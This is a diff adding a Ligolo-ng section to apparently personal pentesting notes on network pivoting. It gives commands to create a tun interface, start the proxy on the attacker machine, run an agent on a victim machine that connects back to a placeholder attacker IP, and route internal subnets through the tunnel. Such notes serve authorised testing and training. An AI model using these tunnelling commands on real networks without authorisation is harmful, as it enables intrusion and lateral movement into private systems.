@@ -12,6 +12,57 @@ Two Main method to do pivioting ;:
 Proxy is good if we want to redirect lots of different kind of traffic into our target network (example nmap scan)
 Port forwading is faster and reliable but only allows us to access single port on a target device
 
+
+## Ligolo-ng 
+
+Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS
+
+
+* On Attacking machine we run the ligolo proxy
+* On the Victim machine we run the ligolo agent
+
+Create a tun interface
+
+```
+attacker@ubuntu:~$ sudo ip tuntap add user [your_username] mode tun ligolo
+
+attacker@ubuntu:~$ sudo ip link set ligolo up
+```
+
+Run Ligolo 
+
+```
+attacker@ubuntu:~$ ./lin-proxy -selfcert -laddr 0.0.0.0:8003
+```
+
+On the Target Machine
+
+```
+C:\Users\> ./agent -connect <attackerip>:8003 -ignore-cert
+```
+
+After we see session is connected Run ifconfig on Attacker machine
+
+```
+[Agent : machine\user@dc1] >> ifconfig
+```
+
+Copy the ip and add it to ligolo using ip route
+
+```
+attacker@ubuntu:~$ sudo ip route add <ip/cidr> dev ligolo
+attacker@ubuntu:~$ sudo ip route add 192.168.49.0/24 dev ligolo   <- example
+```
+
+On ligolo interface we can select the ligolo session after running **session**  and initiate the tunneling process with **start**
+
+```
+[Agent : machine\user@dc1] >> session
+
+[Agent : machine\user@dc1] >> start
+```
+
+
 ## ProxyChains,FoxyProxy
 
 In /etc/proxychains.conf comment out the proxy_dns line which can cause a scan to hang and ultimately crash
